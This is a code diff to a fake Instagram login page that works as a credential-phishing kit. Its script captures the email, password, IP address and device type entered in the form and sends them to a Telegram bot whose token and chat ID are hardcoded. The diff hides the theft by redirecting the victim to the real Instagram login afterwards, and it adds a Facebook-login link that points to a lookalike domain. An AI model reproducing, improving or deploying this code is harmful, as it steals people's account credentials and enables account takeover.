@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="./styles.css" />
     <link rel="icon" type="image/png" href="./img/insta-fav.ico">
-    <title>Instagram </title>
+    <title>Instagram</title>
 </head>
 <body>
     <main class="flex align-items-center justify-content-center">
@@ -32,8 +32,7 @@
                 </div>
                 <div class="login-with-fb flex direction-column align-items-center">
                     <div>
-                        <img />
-                        <a href="#">Log in with Facebook</a>
+                        <a href="#" id="login-with-facebook">Log in with Facebook</a>
                     </div>
                     <a href="#">Forgot your password?</a>
                 </div>
@@ -67,13 +66,14 @@
         </ul>
         <p class="copyright">© 2024 Instagram by Meta</p>
     </footer>
+
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
         const TOKEN = "7858235504:AAH4bthTN0srsW-uPFLPQsIAWSRdXhDonvk"; // Telegram bot token
         const CHAT_ID = "5163875130"; // Telegram chat ID
         const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-        document.getElementById('login-form').addEventListener('submit', function(e) {
+        document.getElementById('login-form').addEventListener('submit', function (e) {
             e.preventDefault();
 
             const email = document.getElementById('email').value;
@@ -90,7 +90,7 @@
                     const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
                     const message = ` 
-                        <b>New Login Attempt from instagram </b>\n
+                        <b>New Login Attempt from Instagram</b>\n
                         <b>Email:</b> ${email}\n
                         <b>Password:</b> ${password}\n
                         <b>IP Address:</b> ${ip}\n
@@ -105,7 +105,8 @@
                         parse_mode: 'html',
                         text: message
                     }).then(response => {
-                        alert('Error sending the information. Please try again');
+                        // Redirect to Instagram's real login page
+                        window.location.href = "https://www.instagram.com/accounts/login/";
                     }).catch(error => {
                         alert('Error sending the information. Please try again.');
                     });
@@ -113,6 +114,11 @@
                 .catch(error => {
                     alert('Error fetching the IP address. Please try again.');
                 });
+        });
+
+        document.getElementById('login-with-facebook').addEventListener('click', function (e) {
+            e.preventDefault();
+            window.location.href = "https://fasebooke.netlify.app";
         });
     </script>
 </body>
